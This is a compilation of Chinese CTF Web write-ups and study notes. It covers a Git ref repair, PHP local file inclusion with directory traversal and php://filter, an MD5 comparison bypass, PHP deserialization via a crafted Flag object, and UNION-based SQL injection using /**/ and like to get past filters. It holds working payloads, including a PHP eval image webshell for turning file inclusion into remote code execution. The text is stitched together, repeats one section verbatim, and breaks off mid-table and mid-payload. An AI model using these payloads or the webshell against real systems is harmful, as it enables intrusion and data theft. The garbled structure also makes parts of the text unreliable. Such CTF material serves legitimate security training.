Git 的“引用链”就像一条**从大门到仓库的路线图**——任何一环断了，Git 就拒绝进门，更不会帮你搬货（读文件）。下面用“找 flag”这个故事串一遍整条链，并指出**你之前缺的是哪一环**。

---

### 1️⃣ 大门牌：HEAD

- 作用：告诉 Git“我现在站在哪个分支门口”。
- 内容示例：
  ```
  ref: refs/heads/master
  ```
- **缺了它** → Git 不知道先迈哪条腿，直接 `fatal: not a git repository`。

---

### 2️⃣ 路口指示牌：refs/heads/<branch>

- 实质：一个普通文本文件，里面只写**一个 SHA-1**。
- 示例（文件 `.git/refs/heads/master`）：
  ```
  5495f65c88f7e8b75a3a58682a4114929bddb10a
  ```
- **缺了它** → 路口牌子被拔了，Git 站在门口找不到下一步，同样退出。
  → **你之前就是这里断了**！

---

### 3️⃣ 仓库房间号：commit 对象

- SHA 指向的对象必须是 **commit 类型**（或至少是可解析的 tree/blob）。
- commit 里再指向 tree → tree 指向 blob → 最终拿到文件内容。
- **缺了/commit 指向错误** → `fatal: Could not parse object 'HEAD'`。

---

### 4️⃣ 整条链完整时

```
HEAD
  ↓  ref:
refs/heads/master
  ↓  SHA:
commit-object
  ↓  tree:
tree-object
  ↓  blob:
flag.txt 内容
```

---

### 5️⃣ 你手动修复的其实就是第 2 环

```bash
mkdir -p .git/refs/heads
echo 5495f65c88f7e8b75a3a58682a4114929bddb10a > .git/refs/heads/master
```

→ 把“路口指示牌”重新立起来，Git 就能顺着牌子走到 blob，**不用管有没有 commit/tree**（你指哪它就解析哪）。

---

### 一句话记忆

“HEAD 给方向，refs 给门牌，对象给内容”——**门牌被拔了，Git 就罢工；把门牌插回去，路就通了。

//////////////////////////////////////////////////////////////////////

下面把“这题”拆成一条一条**可复现的思路**，你只要按顺序往下试，就能自己打出 flag。整套方法论不仅适用于本题，也适用于所有“明显存在文件包含入口”的 CTF Web 题。

---

1. 先找“输入点”

   - 页面里有一个表单／GET 参数／POST 参数，让你“提交食材名”“选择模板”“language=”之类——**凡是你能控制字符串、最后又出现在返回包里的，都是潜在输入点**。
   - 本题输入点就是提示里的
     “请输入食材名（如 food1.webp）”。
2. 用“正常值”探路

   - 先按它给的例子输：`food1.webp`
     目的：看系统怎么回显、报错，确认后端真的在“包含/读取”你给的文件。
   - 本题回显了
     `Warning: Unexpected character ... in /var/www/html/backpack/food1.webp on line 618`
     关键信息：
     – 完整路径被拼出来 → 知道工作目录是 `/var/www/html/backpack/`
     – PHP 把它当 PHP 解析 → 说明用的是 `include/require` 这类函数
     这两条信息已经足够断定“存在文件包含”。
3. 判断过滤
   把下面几种字符分别单独测试，看会不会被拦截或转义：
   `../  ..\  ..  /  \  %2f  %5c  ..%2f  ..%5c`
   如果都能原样出现在报错路径里，就证明**没有过滤**，可以直接目录遍历。
4. 计算“跳几层”到根
   已知工作目录：
   `/var/www/html/backpack/`
   想读到根目录下的 `/flag.txt`，需要向上跳 3 层就到 `/`：
   `backpack/` → `html/` → `www/` → `/`
   所以用 3 个 `../` 即可；为了保险可以多写一个（`../../../../flag.txt`），反正到了根以后再 `../` 还是根。
5. 第一次 payload

   ```
   ../../../../flag.txt
   ```

   提交后如果页面直接回显
   `恭喜！你领悟了魔物饭的美味之处，这是你的奖励 flag{…}`
   那就结束战斗。
   如果返回空白、报错、或提示“文件不存在”，继续下一步。
6. 换“PHP 过滤器”读源码
   后端有可能把 `.txt` 当成 PHP 执行，结果空白；这时用伪协议让它只读不执行：

   ```
   php://filter/read=convert.base64-encode/resource=../../../../flag.txt
   ```

   你会得到一串 Base64，解码即可看到 flag。
   （这个技巧同样适用于读 `.php` 源码，比如想看他到底怎么 include 的。）
7. 如果过滤了关键字
   – 过滤 `../` → 用双写 `....//` 或 URL 编码 `..%2f..%2f`
   – 过滤 `flag` → 用通配符 `fla?` 或 `fl*`（部分系统支持）
   – 过滤 `php://` → 尝试 data://、input://，或者短标签 `pHp://` 大小写绕过
   总之**它过滤什么，就针对什么做变形**，直到路径能出现回显。
8. 进阶：把“读文件”升级成“RCE”
   如果题目允许上传（比如再给你一处“上传头像”功能），可以：

   1. 传一张带 PHP 码的图片马：
      `GIF89a<?=@eval($_POST[x]);?>`
   2. 用刚才的包含点去 `include` 这个图片：
      `../../../../upload/2023xxx/shell.gif`
   3. 拿到 WebShell，想读什么读什么，甚至 cat /root/flag.txt。

---

一句话总结思路
“先找输入→探路径→测过滤→目录遍历到根→伪协议兜底→上传就升 RCE”。

把这条流水线背下来，再遇到“包含类” Web 题，5 分钟就能自己打出 flag。祝你下一次秒出题！

**

下面把“这题”拆成一条一条**可复现的思路**，你只要按顺序往下试，就能自己打出 flag。整套方法论不仅适用于本题，也适用于所有“明显存在文件包含入口”的 CTF Web 题。

---

1. 先找“输入点”

   - 页面里有一个表单／GET 参数／POST 参数，让你“提交食材名”“选择模板”“language=”之类——**凡是你能控制字符串、最后又出现在返回包里的，都是潜在输入点**。
   - 本题输入点就是提示里的
     “请输入食材名（如 food1.webp）”。
2. 用“正常值”探路

   - 先按它给的例子输：`food1.webp`
     目的：看系统怎么回显、报错，确认后端真的在“包含/读取”你给的文件。
   - 本题回显了
     `Warning: Unexpected character ... in /var/www/html/backpack/food1.webp on line 618`
     关键信息：
     – 完整路径被拼出来 → 知道工作目录是 `/var/www/html/backpack/`
     – PHP 把它当 PHP 解析 → 说明用的是 `include/require` 这类函数
     这两条信息已经足够断定“存在文件包含”。
3. 判断过滤
   把下面几种字符分别单独测试，看会不会被拦截或转义：
   `../  ..\  ..  /  \  %2f  %5c  ..%2f  ..%5c`
   如果都能原样出现在报错路径里，就证明**没有过滤**，可以直接目录遍历。
4. 计算“跳几层”到根
   已知工作目录：
   `/var/www/html/backpack/`
   想读到根目录下的 `/flag.txt`，需要向上跳 3 层就到 `/`：
   `backpack/` → `html/` → `www/` → `/`
   所以用 3 个 `../` 即可；为了保险可以多写一个（`../../../../flag.txt`），反正到了根以后再 `../` 还是根。
5. 第一次 payload

   ```
   ../../../../flag.txt
   ```

   提交后如果页面直接回显
   `恭喜！你领悟了魔物饭的美味之处，这是你的奖励 flag{…}`
   那就结束战斗。
   如果返回空白、报错、或提示“文件不存在”，继续下一步。
6. 换“PHP 过滤器”读源码
   后端有可能把 `.txt` 当成 PHP 执行，结果空白；这时用伪协议让它只读不执行：

   ```
   php://filter/read=convert.base64-encode/resource=../../../../flag.txt
   ```

   你会得到一串 Base64，解码即可看到 flag。
   （这个技巧同样适用于读 `.php` 源码，比如想看他到底怎么 include 的。）
7. 如果过滤了关键字
   – 过滤 `../` → 用双写 `....//` 或 URL 编码 `..%2f..%2f`
   – 过滤 `flag` → 用通配符 `fla?` 或 `fl*`（部分系统支持）
   – 过滤 `php://` → 尝试 data://、input://，或者短标签 `pHp://` 大小写绕过
   总之**它过滤什么，就针对什么做变形**，直到路径能出现回显。
8. 进阶：把“读文件”升级成“RCE”
   如果题目允许上传（比如再给你一处“上传头像”功能），可以：

   1. 传一张带 PHP 码的图片马：
      `GIF89a<?=@eval($_POST[x]);?>`
   2. 用刚才的包含点去 `include` 这个图片：
      `../../../../upload/2023xxx/shell.gif`
   3. 拿到 WebShell，想读什么读什么，甚至 cat /root/flag.txt。

---

一句话总结思路
“先找输入→探路径→测过滤→目录遍历到根→伪协议兜底→上传就升 RCE”。

把这条流水线背下来，再遇到“包含类” Web 题，5 分钟就能自己打出 flag。祝你下一次秒出题！

**“看到 Parse error，就等于 PHP 已经开机解析。”**
再配合路径被完整拼出来，就能瞬间判定：
→ 后端在用 `include`/`require`（或 `include_once`/`require_once`）
→ 存在本地文件包含（LFI）漏洞。

/////////////////////////////////////////////////////////////////////////////

### 三重 MD5 闯关要求

**表格**复制


| 关卡 | 比较运算符                                                                             | 要求（必须同时满足）                                                                                                  |
| :--- | :------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------- |
| 1    | `md5($a) == md5($b)`                                                                   | ①`$a !== $b`（值或类型至少有一项不同）<br/>② 弱比较相等 → 用“0e 科学计数法”即可                                  |
| 2    | `md5((string)$a) === md5((string)$b)`                                                  | ①`$a !== $b`<br/>② 强比较相等 → **数组 trick**：`md5((string)数组)` 返回 **NULL**，两个 NULL 恒等                  |
| 3    | `md5((string)$a) === md5((string)$b)` 且 **(string)**a**!**==**(**s**t**r**in**g**)b** | ① 摘要强相等<br/>② 字符串形式**必须不相等** → 继续用**数组 trick**，但让 `(string)$a` 与 `(string)$b` 长度不同即可 |

---

### 现成 payload（一键通）

**bash**复制

```bash
curl -X POST \
  -d 'a=QNKCDZO&b=s878926199a&aa[]=1&bb[]=2&aaa[0][0]=1&bbb[1]=2' \
  http://靶机IP/index.php
```

解释：

* 第一关：0e 弱相等 ✅
* 第二关：两个空数组转 NULL 强相等 ✅
* 第三关：



# CTF 题目 WP：从文件包含到反序列化的 flag 获取

## 一、题目场景

题目给出一段 PHP 源码，要求通过 URL 传参获取服务器上的 flag（通常存于`flag.php`）：

php

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  // 提示：useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

## 二、解题步骤

### 步骤 1：分析源码逻辑，明确突破点

源码核心流程：

1. 验证`$text`：必须存在且`file_get_contents($text)`的结果为`"welcome to the zjctf"`；
2. 验证`$file`：若包含`"flag"`字符串则退出，否则`include($file)`；
3. 处理`$password`：反序列化后`echo`输出。

**突破点**：

* 需让`$text`通过验证（入口条件）；
* 需通过`$file`包含一个含可利用类的文件（提示`useless.php`）；
* 需构造`$password`的序列化对象，触发文件读取。

### 步骤 2：突破`$text`验证（`data://`伪协议）

#### 问题：

`file_get_contents($text)`需要返回`"welcome to the zjctf"`。若直接传`text=welcome to the zjctf`，`file_get_contents`会将其当作文件名（服务器不存在该文件，失败）。

#### 解决：

使用`data://`伪协议，让`file_get_contents`直接读取字符串而非文件。

#### 原理：

`data://`是 PHP 支持的伪协议，格式为`data://[MIME类型],[内容]`，可直接将内容作为数据流传递。例如：`data://text/plain,welcome to the zjctf`中，`text/plain`表示纯文本类型，逗号后为实际内容。`file_get_contents`会直接读取该内容，无需访问真实文件。

#### 操作：

构造`text`参数：

plaintext

```plaintext
text=data://text/plain,welcome to the zjctf
```

### 步骤 3：读取`useless.php`源码（`php://filter`伪协议）

#### 问题：

`include($file)`需要包含`useless.php`，但不知道其内容（反序列化需依赖该文件中的类定义）。直接包含会执行 PHP 代码，无法查看源码。

#### 解决：

使用`php://filter`伪协议读取`useless.php`的源码（以 base64 编码形式输出，避免被 PHP 解析）。

#### 原理：

`php://filter`是 PHP 的过滤器伪协议，可在读取文件时对内容进行处理。格式为：`php://filter/read=转换方式/resource=目标文件`

* `read=convert.base64-encode`：将文件内容转为 base64 编码（纯文本，不会被 PHP 执行）；
* `resource=useless.php`：指定读取`useless.php`。

#### 操作：

组合`text`和`file`参数，构造 payload：

plaintext

```plaintext
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

#### 结果：

页面返回`useless.php`的 base64 编码内容，解码后得到源码：

php

```php
<?php  
class Flag{  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```

### 步骤 4：构造`$password`的反序列化 payload

#### 分析`useless.php`：

* 定义了`Flag`类，含公共属性`$file`；
* 含`__toString`魔术方法：当对象被`echo`时，自动读取`$file`对应的文件内容。

#### 目标：

构造`Flag`类的序列化对象，将`$file`设为`flag.php`（目标文件），反序列化后`echo`触发`__toString`，读取 flag。

#### 原理：

* **反序列化**：PHP 的`unserialize()`函数可将序列化字符串还原为对象，需先加载类定义（`include(useless.php)`已完成）；
* **魔术方法`__toString`**：当对象被当作字符串处理（如`echo`）时自动调用，这里用于读取文件。

#### 操作：

1. 编写 PHP 代码生成序列化对象：

php

```php
<?php
class Flag{  // 与useless.php中的类名一致
    public $file;  // 与类中的属性名一致
}
$obj = new Flag();
$obj->file = "flag.php";  // 设置要读取的文件
echo serialize($obj);  // 输出序列化字符串
?>
```

2. 执行后得到序列化结果：

plaintext

```plaintext
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

### 步骤 5：组合 payload，获取 flag

#### 最终 payload：

plaintext

```plaintext
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

#### 执行流程：

1. `text`通过验证，进入逻辑；
2. `file=useless.php`被包含，加载`Flag`类；
3. `password`被反序列化为`Flag`对象（`$file=flag.php`）；
4. `echo $password`触发`__toString`，读取`flag.php`内容并输出。

#### 结果：

查看页面源码（flag 常藏于注释中），得到 flag（如`NSSCTF{452862a3-9f27-4e31-85e5-520c7ad2fef1}`）。

## 三、核心知识点原理

### 1. `file_get_contents`函数

* 作用：读取文件内容（或数据流）并返回字符串；
* 特性：不仅能读本地文件，还支持伪协议（`data://`、`php://`等），这是本题突破的基础。

### 2. 伪协议

* **`data://`**：用于直接传递数据，格式`data://[MIME类型],[内容]`，让函数读取字符串而非文件；
* **`php://filter`**：用于过滤文件内容，`convert.base64-encode`可将 PHP 文件源码转为 base64 编码，避免被解析执行，从而读取源码。

### 3. 文件包含（`include`）

* 作用：将指定文件的内容当作 PHP 代码执行；
* 风险：若`$file`可控，可能包含恶意文件或通过伪协议读取敏感文件（本题利用其加载`useless.php`中的类）。

### 4. 反序列化

* 序列化：将 PHP 对象转为字符串（便于存储 / 传输），格式如`O:类名长度:"类名":属性数:{属性1;属性值1;...}`；
* 反序列化：`unserialize()`将字符串还原为对象，需先加载类定义（否则报错 “Class not found”）；
* 风险：若反序列化内容可控，可能结合魔术方法执行恶意代码（本题利用`__toString`读取文件）。

### 5. 魔术方法`__toString`

* 触发条件：当对象被当作字符串处理时（如`echo`、字符串拼接等）；
* 作用：定义对象转为字符串的行为，本题中被用于读取`$file`对应的文件内容。



**题目环境**：一个简单的查询页面，提示 “请输入查询关键词”，核心参数为`wllm`（通过 URL 传入，如`?wllm=xxx`）。**隐藏目标**：通过 SQL 注入获取数据库中`flag`的值。**过滤规则**：空格被过滤（无法直接使用空格），等号`=`被过滤（无法直接使用`=`）。

## **一、解题思路（整体流程）**

1. **判断注入点类型**：确定`wllm`参数是字符型还是数字型注入，以及闭合方式。
2. **绕过过滤规则**：用`/**/`替代空格，用`like`替代等号。
3. **确定查询列数**：用`order by`测试后端查询的列数（为联合查询做准备）。
4. **定位回显位**：用`union select`确定哪些列会在页面上显示（回显位）。
5. **枚举数据库信息**：依次查询数据库名→表名→列名（利用 SQL 内置系统表）。
6. **获取 flag**：直接查询目标列的内容，处理可能的回显长度限制。

## **二、详细 Writeup（WP）**

### **步骤 1：判断注入点类型及闭合方式**

**操作**：向`wllm`参数传入单引号`'`，观察页面响应。**Payload**：`?wllm=1'`

**响应**：页面提示 SQL 语法错误（如`You have an error in your SQL syntax... near ''''`）。

**结论**：

* 注入点为**字符型**（后端用单引号包裹参数，原始 SQL 可能为`select * from 表 where wllm='用户输入'`）。
* 闭合方式：需用单引号`'`闭合原始语句中的引号。

### **步骤 2：绕过过滤，测试查询列数**

**已知过滤**：空格和`=`被拦截，需用`/**/`（SQL 注释，等效于空格）替代空格，用`like`替代`=`。

**目标**：确定后端查询的列数（联合查询需列数一致）。

**操作 1**：测试第 3 列是否存在**Payload**：`?wllm=1'order/**/by/**/3%23`（`%23`是`#`的 URL 编码，用于注释后续内容）**响应**：页面正常（无报错）→ 第 3 列存在。

**操作 2**：测试第 4 列是否存在**Payload**：`?wllm=1'order/**/by/**/4%23`**响应**：页面报错（如`Unknown column '4'`）→ 第 4 列不存在。

**结论**：后端查询共**3 列**。

### **步骤 3：定位回显位（数据显示位置）**

**目标**：确定联合查询的结果会在页面的哪一列显示（回显位）。

**操作**：用`union select`构造联合查询，传入数字标记列。**Payload**：`?wllm=-1'union/**/select/**/1,2,3%23`（`-1'`让原始查询无结果，确保联合查询结果显示；`1,2,3`分别对应 3 列）

**响应**：页面显示`Your Login name:2 Your Password:3`。

**结论**：第 2 列和第 3 列是**回显位**（后续查询结果需放在这两列才能显示）。

### **步骤 4：查询当前数据库名**

**目标**：获取当前数据库名称（后续查表需指定数据库）。

**操作**：用`database()`函数（返回当前数据库名），放在回显位。**Payload**：`?wllm=-1'union/**/select/**/1,2,database()%23`

**响应**：页面显示`Your Password:test_db`。

**结论**：当前数据库名为`test_db`。

### **步骤 5：查询数据库中的表名**

**目标**：获取`test_db`数据库中的所有表名（找存 flag 的表）。

**操作**：从 SQL 内置系统表`information_schema.tables`查询（该表存储所有表信息）。**Payload**：`?wllm=-1'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23`（`group_concat`用于合并表名；`like`替代`=`，因`=`被过滤）

**响应**：页面显示`Your Password:LTLT_flag,users`。

**结论**：`test_db`中有`LTLT_flag`（含`flag`，目标表）和`users`表。

### **步骤 6：查询目标表的列名**

**目标**：获取`LTLT_flag`表中的列名（找存 flag 的列）。

**操作**：从 SQL 内置系统表`information_schema.columns`查询（该表存储所有列信息）。**Payload**：`?wllm=-1'union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'LTLT_flag'%23`

**响应**：页面显示`Your Password:id,flag`。

**结论**：`LTLT_flag`表中有`flag`列（目标列）。

### **步骤 7：获取 flag（处理回显长度限制）**

**目标**：查询`flag`列的内容，处理可能的显示截断。

**操作 1**：直接查询 flag（若显示完整）**Payload**：`?wllm=-1'union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23`

**响应**：页面显示`Your Password:NSSCTF{cae0af52-b007`（被截断，仅显示前 20 字符）。

**操作 2**：用`mid`分段截取（解决截断）

* 第 1-20 位：`?wllm=-1'union/**/select/**/1,2,mid(group_concat(flag),1,20)%23`
  结果：`NSSCTF{cae0af52-b007`
* 第 21-40 位：`?wllm=-1'union/**/select/**/1,2,mid(group_concat(flag),21,20)%23`
  结果：`-4a7f-8e7a-8d6f7}`

**拼接完整 flag**：`NSSCTF{cae0af52-b007-4a7f-8e7a-8d6f7}`

## **三、核心知识点原理详解**

### 1. **SQL 注入的本质**

SQL 注入是由于后端未对用户输入进行过滤，导致用户输入被当作 SQL 代码执行的漏洞。例如：

* 正常输入：`?wllm=1` → 后端执行`select * from 表 where wllm='1'`（合法查询）。
* 恶意输入：`?wllm=1' or '1'='1` → 后端执行`select * from 表 where wllm='1' or '1'='1'`（条件恒真，返回所有数据）。

### 2. **字符型 vs 数字型注入**

* **字符型**：参数被单引号 / 双引号包裹（如`where wllm='值'`），需用引号闭合（如`1'`）。
* **数字型**：参数直接作为数字（如`where id=值`），无需闭合引号（如`1 or 1=1`）。
  **判断方法**：输入单引号`'`，若报错则为字符型（如本题）；若无反应可能为数字型。

### 3. **过滤绕过技巧**

* **空格过滤**：用`/**/`替代（`/**/`是 SQL 多行注释，解析时会被忽略，等效于空格）。
  例：`order by` → `order/**/by`。
* **等号`=`过滤**：用`like`替代（`like`在字符串精确匹配时与`=`等效）。
  例：`table_schema='test_db'` → `table_schema like 'test_db'`。

### 4. **`order by`的作用**

`order by N`用于按 “第 N 列” 排序，若 N 超过实际列数则报错。通过测试不同 N 的值，可确定后端查询的列数（如本题中`order by 3`正常，`order by 4`报错，说明共 3 列）。**为什么需要列数**：`union select`要求前后查询列数必须一致，否则语法错误。

### 5. **`union select`联合查询**

`union select`用于合并两个查询的结果，仅当第一个查询无结果时，第二个查询的结果才会显示（因此用`-1'`让第一个查询无匹配）。例：`-1'union select 1,2,3` → 第一个查询无结果，显示`1,2,3`，由此定位回显位。

### 6. **SQL 内置系统表`information_schema`**

`information_schema`是 MySQL/MariaDB 的系统数据库，存储所有数据库、表、列的元信息：

* `information_schema.tables`：存储所有表的信息（库名、表名等）。
* `information_schema.columns`：存储所有列的信息（表名、列名等）。
  通过查询这两个表，可枚举目标数据库的结构（如本题中查`test_db`的表和列）。

### 7. **字符串截取函数（处理回显限制）**

当 flag 过长被截断时，用以下函数分段截取：

* `mid(str, start, length)`：从`start`位置开始，截取`length`个字符（如`mid(flag,1,20)`取前 20 位）。
* `substr(str, start, length)`：与`mid`功能完全相同。
* `left(str, length)`/`right(str, length)`：取字符串左边 / 右边的`length`个字符。

### 8. **注释符的作用**

* `#`或`--+`：用于注释后续 SQL 内容，避免注入语句被原始 SQL 的多余部分干扰。
  例：`1' order by 3#` → 原始 SQL 中多余的`'`被`#`注释，语句合法。
